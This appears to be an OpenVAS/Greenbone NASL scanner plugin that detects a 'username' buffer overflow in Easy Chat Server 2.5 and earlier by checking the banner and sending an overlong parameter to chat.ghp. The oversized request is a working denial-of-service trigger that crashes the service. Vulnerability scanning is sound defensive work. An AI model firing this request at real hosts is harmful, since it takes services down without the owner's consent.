if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901201" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-08-25 09:25:35 +0200 (Thu, 25 Aug 2011)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Easy Chat Server 'username' Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519257" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2011/Aug/109" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/104016" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Easy_Chat_Server/banner" );
	script_tag( name: "impact", value: "Successful exploitation could allow remote attackers to execute
  arbitrary code on the system or cause the application to crash." );
	script_tag( name: "affected", value: "Easy Chat Server Version 2.5 and before." );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing URL
  parameters. Which can be exploited to cause a buffer overflow by sending
  an overly long 'username' parameter to 'chat.ghp' script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with Easy Chat Server and is prone to
  Buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Easy Chat Server" )){
	exit( 0 );
}
url = "/chat.ghp?username=" + crap( data: "A", length: 1000 ) + "&password=null&room=1&null=2";
req = http_get( item: url, port: port );
res = http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

